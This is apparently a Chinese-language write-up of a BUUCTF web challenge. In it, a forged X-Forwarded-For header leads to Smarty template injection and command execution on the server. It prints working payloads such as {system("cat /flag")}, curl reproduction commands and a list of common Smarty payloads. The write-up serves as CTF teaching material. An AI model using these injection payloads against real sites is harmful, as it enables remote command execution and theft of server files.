---
title: "[BJDCTF2020]The mystery of ip"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, smarty, template-injection, x-forwarded-for]
vulnerability: Smarty模板注入导致命令执行
solved: true
flag: "flag{de8ced19-62ba-4583-b57b-4127213b9dcf}"
---

# [BJDCTF2020]The mystery of ip

## 题目概述
题目是一个简单的 PHP 网站，包含三个页面：首页、flag.php 和 hint.php。flag.php 页面会显示访问者的 IP 地址，hint.php 提示"Do you know why i know your ip?"，暗示 IP 来源可能可控。

## 信息收集
1. 访问首页，发现导航栏有 Flag 和 Hint 两个链接
2. 访问 flag.php，显示 "Your IP is : 192.168.122.15"
3. 访问 hint.php，HTML 注释中发现提示：`<!-- Do you know why i know your ip? -->`
4. 测试 X-Forwarded-For 头，发现可以控制显示的 IP 地址

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：Smarty 模板注入 (SSTI)

**原理**：
- 服务器使用 Smarty 模板引擎渲染页面
- 用户通过 X-Forwarded-For 头传入的 IP 值直接被传入 Smarty 模板
- Smarty 的 `{system()}` 函数可以执行系统命令

**判断过程**：
1. 测试 `{{7*7}}` → 返回 49，确认存在模板注入
2. 测试 `{{self.__class__.__mro__}}` → 报错信息暴露使用 Smarty 模板引擎
3. 使用 Smarty 语法 `{system("ls /")}` 成功执行命令

## 利用过程（Payload + Flag）

**Payload 1**：确认 SSTI
```
X-Forwarded-For: {{7*7}}
```

**Payload 2**：识别模板引擎（通过报错信息）
```
X-Forwarded-For: {{self.__class__.__mro__}}
```

**Payload 3**：执行命令查看根目录
```
X-Forwarded-For: {system("ls /")}
```
发现 `/flag` 文件

**Payload 4**：读取 flag
```
X-Forwarded-For: {system("cat /flag")}
```
获得 flag: `flag{de8ced19-62ba-4583-b57b-4127213b9dcf}`

## 复现步骤
```bash
# 1. 测试 IP 控制
curl -s "http://target/flag.php" -H "X-Forwarded-For: 127.0.0.1"

# 2. 测试 SSTI
curl -s "http://target/flag.php" -H "X-Forwarded-For: {{7*7}}"

# 3. 执行命令获取 flag
curl -s "http://target/flag.php" -H 'X-Forwarded-For: {system("cat /flag")}'
```

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| SSTI (Smarty) | X-Forwarded-For 头 | `{system("cat /flag")}` | Smarty模板函数、HTTP头伪造 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
1. 看到 IP 显示 → 立即测试 X-Forwarded-For、Client-IP 等头
2. SSTI 测试流程：先测 `{{7*7}}`，再根据报错识别模板引擎
3. Smarty SSTI 特征：使用 `{function()}` 而非 `{{}}` 语法

**同类题型套路**：
- IP/UA/Referer 显示类题目 → 测试 HTTP 头注入
- 模板注入 → 根据模板引擎选择对应 payload
- Smarty 常用 payload：`{system()}`, `{if}`, `{php}` 等
